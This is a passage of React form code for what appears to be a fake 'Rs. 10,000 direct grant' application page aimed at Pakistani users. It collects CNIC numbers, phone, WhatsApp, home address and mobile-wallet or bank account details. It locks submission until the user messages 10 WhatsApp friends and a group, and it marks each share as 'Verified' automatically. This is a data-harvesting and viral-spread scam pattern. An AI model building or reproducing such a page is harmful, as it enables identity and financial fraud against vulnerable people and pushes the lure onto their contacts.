                hint="As printed on your official CNIC / Identity Card"
                required
              />

              {/* 2. CNIC */}
              <Input
                label="2. CNIC / National ID (شناختی کارڈ نمبر)"
                placeholder="e.g. 42101-1234567-8"
                value={nationalId}
                onChange={(e) => handleNationalIdChange(e.target.value)}
                maxLength={15}
                error={errors.nationalId}
                hint="13-digit CNIC number (e.g. 42101-1234567-8)"
                required
              />

              {/* 3 & 4: Phone & WhatsApp */}
              <div className="form-grid-2">
                <Input
                  type="tel"
                  label="3. Phone Number (موبائل فون نمبر)"
                  placeholder="e.g. 0300-1234567"
                  value={phone}
                  onChange={(e) => handlePhoneChange(e.target.value)}
                  maxLength={12}
                  error={errors.phone}
                  hint="Active 11-digit mobile number (e.g. 0300-1234567)"
                  required
                />

                <Input
                  type="tel"
                  label="4. WhatsApp Number (واٹس ایپ نمبر)"
                  placeholder="e.g. 0300-1234567"
                  value={whatsappNumber}
                  onChange={(e) => handleWhatsappNumberChange(e.target.value)}
                  maxLength={12}
                  error={errors.whatsappNumber}
                  hint="Active 11-digit WhatsApp number (e.g. 0300-1234567)"
                  required
                />
              </div>

              {/* 5. Address */}
              <Textarea
                rows={2}
                label="5. Complete Address & City (مکمل پتہ اور شہر)"
                placeholder="e.g. House # 14, Street 2, Sector G-10, Islamabad / Lahore / Karachi"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                error={errors.address}
                hint="Current residential address and city"
                required
              />
            </div>

            {/* =========================================================================
                SECTION 2: ACCOUNT DETAILS FOR DIRECT RS. 10,000 TRANSFER
                ========================================================================= */}
            <div style={{ borderBottom: '2px solid var(--navy-100)', paddingBottom: '1.75rem', marginBottom: '2rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.25rem' }}>
                <div
                  style={{
                    padding: '0.5rem',
                    backgroundColor: '#eff6ff',
                    color: '#1d4ed8',
                    borderRadius: 'var(--radius-md)',
                  }}
                >
                  <Wallet size={22} />
                </div>
                <div>
                  <h3 style={{ fontSize: '1.2rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                    2. Payment Account for Direct {grantAmount} Transfer (اکاؤنٹ کی تفصیلات)
                  </h3>
                  <p style={{ fontSize: '0.8125rem', color: 'var(--text-muted)' }}>
                    اگر آپ اہل ہوتے ہیں تو 10,000 روپے براہ راست اسی اکاؤنٹ میں بھیجے جائیں گے
                  </p>
                </div>
              </div>

              {/* Direct 10k Notice Banner */}
              <div
                style={{
                  backgroundColor: '#ecfdf5',
                  border: '1px solid #a7f3d0',
                  borderRadius: 'var(--radius-md)',
                  padding: '1rem',
                  marginBottom: '1.25rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.75rem',
                }}
              >
                <Award size={24} color="#059669" style={{ flexShrink: 0 }} />
                <div style={{ fontSize: '0.875rem', color: '#065f46', lineHeight: '1.45' }}>
                  <strong>Direct {grantAmount} Disbursement:</strong> براہ کرم درست ایزی پیسہ، جاز کیش یا بینک اکاؤنٹ فراہم کریں تاکہ منظوری کے بعد رقم بغیر کسی تاخیر کے منتقل کی جا سکے۔
                </div>
              </div>

              {/* Account Type Selector */}
              <div className="form-group">
                <label className="form-label">
                  Select Account / Wallet Type (اکاؤنٹ کی قسم) <span className="required-star">*</span>
                </label>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(100px, 1fr))', gap: '0.35rem' }}>
                  {['Easypaisa', 'JazzCash', 'Bank Account', 'SadaPay', 'NayaPay'].map((type) => (
                    <button
                      key={type}
                      type="button"
                      onClick={() => setAccountType(type)}
                      style={{
                        padding: '0.4rem 0.35rem',
                        borderRadius: '6px',
                        border: accountType === type ? '2px solid var(--primary-600)' : '1px solid var(--navy-200)',
                        backgroundColor: accountType === type ? 'var(--primary-50)' : '#ffffff',
                        color: accountType === type ? 'var(--primary-800)' : 'var(--navy-800)',
                        fontWeight: accountType === type ? 800 : 600,
                        fontSize: '0.78rem',
                        cursor: 'pointer',
                        textAlign: 'center',
                        transition: 'all var(--transition-fast)',
                      }}
                    >
                      {type}
                    </button>
                  ))}
                </div>
              </div>

              <div className="form-grid-2">
                <Input
                  label={`Account Number / Mobile Wallet (${accountType} نمبر)`}
                  placeholder={accountType === 'Bank Account' ? 'e.g. PK00BAHL0000000000' : 'e.g. 0300-1234567'}
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                  error={errors.accountNumber}
                  hint={`Active ${accountType} number to receive ${grantAmount}`}
                  required
                />

                <Input
                  label="Account Title / Beneficiary Name (اکاؤنٹ ہولڈر کا نام)"
                  placeholder="e.g. Muhammad Tariq"
                  value={accountTitle}
                  onChange={(e) => setAccountTitle(e.target.value)}
                  error={errors.accountTitle}
                  hint="Full name registered on this account"
                  required
                />
              </div>

              {accountType === 'Bank Account' && (
                <Input
                  label="Bank Name (بینک کا نام)"
                  placeholder="e.g. HBL / Meezan Bank / UBL / Allied Bank"
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  required
                />
              )}
            </div>

            {/* =========================================================================
                SECTION 3: CLEAN SINGLE-BUTTON SMART WHATSAPP OUTREACH
                ========================================================================= */}
            <div style={{ marginBottom: '1.5rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1rem' }}>
                <div
                  style={{
                    padding: '0.45rem',
                    backgroundColor: 'var(--whatsapp-light)',
                    color: 'var(--whatsapp-dark)',
                    borderRadius: '8px',
                  }}
                >
                  <MessageSquare size={18} />
                </div>
                <div>
                  <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                    3. WhatsApp Share Tasks (میٹر 100% کرنے کے لیے شیئر کریں)
                  </h3>
                  <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>
                    صرف نیچے دیے گئے بٹن پر کلک کر کے واٹس ایپ پر میسج بھیجیں۔ سینڈ کرنے کے بعد واپس آنے پر کاؤنٹ خود بخود بڑھے گا۔
                  </p>
                </div>
              </div>

              {/* TASK 1: SHARE WITH 10 FRIENDS (50% -> 90%) */}
              <div
                style={{
                  backgroundColor: contactsSharedCount >= targetContacts ? '#f0fdf4' : '#ffffff',
                  border: contactsSharedCount >= targetContacts ? '1.5px solid #86efac' : '1px solid var(--border)',
                  borderRadius: '10px',
                  padding: '1rem',
                  marginBottom: '1rem',
                  boxShadow: 'var(--shadow-xs)',
                }}
              >
                <div
                  style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    gap: '0.75rem',
                    marginBottom: '0.5rem',
                  }}
                >
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                      <span
                        style={{
                          backgroundColor: contactsSharedCount >= targetContacts ? '#25D366' : '#dbeafe',
                          color: contactsSharedCount >= targetContacts ? '#064e3b' : '#1e40af',
                          padding: '0.15rem 0.45rem',
                          borderRadius: 'var(--radius-sm)',
                          fontSize: '0.7rem',
                          fontWeight: 800,
                        }}
                      >
                        TASK 1 (+40% Meter)
                      </span>
                      <h4 style={{ fontSize: '0.925rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                        Share on WhatsApp with 10 Friends ({contactsSharedCount}/{targetContacts})
                      </h4>
                    </div>
                    <p style={{ fontSize: '0.78rem', color: 'var(--navy-600)', margin: '0.25rem 0 0' }}>
                      ہر بار بٹن دبا کر واٹس ایپ پر جا کر دوست کو میسج سینڈ کریں۔ واپس آنے پر کاؤنٹ +1 خود بخود شامل ہوگا۔
                    </p>
                  </div>

                  <span
                    style={{
                      fontFamily: 'var(--font-mono)',
                      fontSize: '1rem',
                      fontWeight: 800,
                      color: contactsSharedCount >= targetContacts ? '#15803d' : '#0369a1',
                      whiteSpace: 'nowrap',
                    }}
                  >
                    {contactsSharedCount}/{targetContacts} Verified
                  </span>
                </div>

                {/* 10 Visual Progress Slots Indicator */}
                <div
                  className="share-slots-grid"
                  style={{
                    margin: '0.5rem 0 0.75rem',
                  }}
                >
                  {Array.from({ length: targetContacts }).map((_, idx) => {
                    const isDone = idx < contactsSharedCount;
                    const isCurrent = !isDone && idx === contactsSharedCount;

                    return (
                      <div
                        key={idx}
                        style={{
                          height: '22px',
                          borderRadius: '4px',
                          backgroundColor: isDone ? '#25D366' : isCurrent ? '#dbeafe' : 'var(--navy-100)',
                          border: isDone
                            ? '1px solid #16a34a'
                            : isCurrent
                            ? '1.5px solid #2563eb'
                            : '1px solid var(--navy-200)',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          fontSize: '0.68rem',
                          fontWeight: 800,
                          color: isDone ? '#ffffff' : isCurrent ? '#1e40af' : 'var(--navy-400)',
                          transition: 'all 250ms ease',
                        }}
                        title={`Friend #${idx + 1}`}
                      >
                        {isDone ? '✓' : idx + 1}
                      </div>
                    );
                  })}
                </div>

                {/* Simple 1-Click Button */}
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem', alignItems: 'center' }}>
                  {contactsSharedCount < targetContacts ? (
                    <Button
                      type="button"
                      variant="whatsapp"
                      size="sm"
                      onClick={handleShareContact}
                      loading={isSharingActive && activeShareMode === 'contact'}
                      icon={<MessageSquare size={16} />}
                      style={{
                        padding: '0.55rem 1rem',
                        fontSize: '0.85rem',
                      }}
                    >
                      <span>
                        📲 دوست #{contactsSharedCount + 1} کو واٹس ایپ پر بھیجیں (Share #{contactsSharedCount + 1})
                      </span>
                    </Button>
                  ) : (
                    <div
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: '0.35rem',
                        color: '#15803d',
                        fontWeight: 700,
                        fontSize: '0.8rem',
                        backgroundColor: '#dcfce7',
                        padding: '0.35rem 0.75rem',
                        borderRadius: 'var(--radius-sm)',
                      }}
                    >
                      <CheckCircle2 size={16} />
                      <span>Task 1 Complete: 10 Contacts Verified (+40%)</span>
                    </div>
                  )}

                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={handleCopyMessage}
                    icon={copiedMsg ? <Check size={14} color="var(--primary-600)" /> : <Copy size={14} />}
                  >
                    {copiedMsg ? 'Copied!' : 'Copy Text'}
                  </Button>
                </div>

                {errors.contacts && (
                  <div style={{ fontSize: '0.75rem', color: 'var(--danger)', marginTop: '0.35rem', fontWeight: 600 }}>
                    ⚠️ {errors.contacts}
                  </div>
                )}
              </div>

              {/* TASK 2: SHARE IN 1 WHATSAPP GROUP (90% -> 100%) */}
              <div
                style={{
                  backgroundColor: isGroupShared ? '#f0fdf4' : '#ffffff',
                  border: isGroupShared ? '1.5px solid #86efac' : '1px solid var(--border)',
                  borderRadius: '10px',
                  padding: '1rem',
                  marginBottom: '1rem',
                  boxShadow: 'var(--shadow-xs)',
                  opacity: contactsSharedCount < targetContacts ? 0.75 : 1,
                }}
              >
                <div
                  style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    gap: '0.75rem',
                    marginBottom: '0.5rem',
                  }}
                >
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                      <span
                        style={{
                          backgroundColor: isGroupShared ? '#25D366' : '#fef3c7',
                          color: isGroupShared ? '#064e3b' : '#92400e',
                          padding: '0.15rem 0.45rem',
                          borderRadius: 'var(--radius-sm)',
                          fontSize: '0.7rem',
                          fontWeight: 800,
                        }}
                      >
                        TASK 2 (+10% Meter)
                      </span>
                      <h4 style={{ fontSize: '0.925rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                        Share in 1 WhatsApp Group ({isGroupShared ? 1 : 0}/{targetGroups})
                      </h4>
                    </div>
                    <p style={{ fontSize: '0.78rem', color: 'var(--navy-600)', margin: '0.25rem 0 0' }}>
                      کسی بھی 1 واٹس ایپ گروپ میں میسج بھیج کر میٹر 100% مکمل کریں۔
                    </p>
                  </div>

                  <span
                    style={{
                      fontFamily: 'var(--font-mono)',
                      fontSize: '1rem',
                      fontWeight: 800,
                      color: isGroupShared ? '#15803d' : '#92400e',
                      whiteSpace: 'nowrap',
                    }}
                  >
                    {isGroupShared ? 1 : 0}/{targetGroups} Group
                  </span>
                </div>

                <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem', alignItems: 'center' }}>
                  {!isGroupShared ? (
                    <Button
                      type="button"
                      variant="whatsapp"
                      size="sm"
                      onClick={handleShareGroup}
                      loading={isSharingActive && activeShareMode === 'group'}
                      icon={<Users size={16} />}
                      disabled={contactsSharedCount < targetContacts}
                      style={{
                        padding: '0.55rem 1rem',
                        fontSize: '0.85rem',
                      }}
                    >
                      <span>👥 واٹس ایپ گروپ میں شیئر کریں (Share in WhatsApp Group)</span>
                    </Button>
                  ) : (
                    <div
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: '0.35rem',
                        color: '#15803d',
                        fontWeight: 700,
                        fontSize: '0.8rem',
                        backgroundColor: '#dcfce7',
                        padding: '0.35rem 0.75rem',
                        borderRadius: 'var(--radius-sm)',
                      }}
                    >
                      <CheckCircle2 size={16} />
                      <span>Task 2 Complete: Group Shared (100% Reached)</span>
                    </div>
                  )}
                </div>

                {errors.groups && (
                  <div style={{ fontSize: '0.75rem', color: 'var(--danger)', marginTop: '0.35rem', fontWeight: 600 }}>
                    ⚠️ {errors.groups}
                  </div>
                )}
              </div>
            </div>

            {/* =========================================================================
                SECTION 4: TRUTH DECLARATION & SUBMISSION
                ========================================================================= */}
            <div
              style={{
                backgroundColor: 'var(--surface-subtle)',
                border: '1px solid var(--border)',
                padding: '0.875rem',
                borderRadius: '8px',
                marginBottom: '1.25rem',
              }}
            >
              <Checkbox
                id="simple-10k-declaration-v7"
                label="میں تصدیق کرتا/کرتی ہوں کہ فراہم کردہ تمام تفصیلات، اکاؤنٹ نمبر اور واٹس ایپ شیئرز بالکل درست ہیں۔ (I confirm that my details and account information are 100% accurate for direct transfer.)"
                checked={declaredTruth}
                onChange={(val) => setDeclaredTruth(val)}
                error={errors.declaration}
                required
              />
            </div>

            {/* Submit Application Button */}
            <div>
              <Button
                type="submit"
                variant="primary"
                size="lg"
                fullWidth
                loading={isSubmitting}
                icon={<Send size={18} />}
                disabled={!isMeterComplete || !declaredTruth}
                style={{
                  padding: '0.75rem 1rem',
                  fontSize: '0.95rem',
                  boxShadow:
                    isMeterComplete && declaredTruth ? '0 6px 16px -2px rgba(5, 150, 105, 0.4)' : undefined,
                  opacity: isMeterComplete && declaredTruth ? 1 : 0.65,
                }}
              >
                {isMeterComplete
                  ? `Submit Application for ${grantAmount} (درخواست جمع کروائیں)`
                  : `Complete Meter to 100% to Submit (${meterPercentage}% / 100%)`}
              </Button>

              {!isMeterComplete && (
                <div
                  style={{
                    textAlign: 'center',
                    fontSize: '0.8125rem',
                    color: '#e11d48',
                    marginTop: '0.6rem',
                    fontWeight: 600,
                  }}
                >
                  ⚠️ براہ کرم اوپر دیے گئے 10 دوستوں اور 1 گروپ کو میسج سینڈ کر کے تصدیق کریں تاکہ میٹر 100% ہو اور درخواست جمع ہو سکے۔
                </div>
              )}
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};
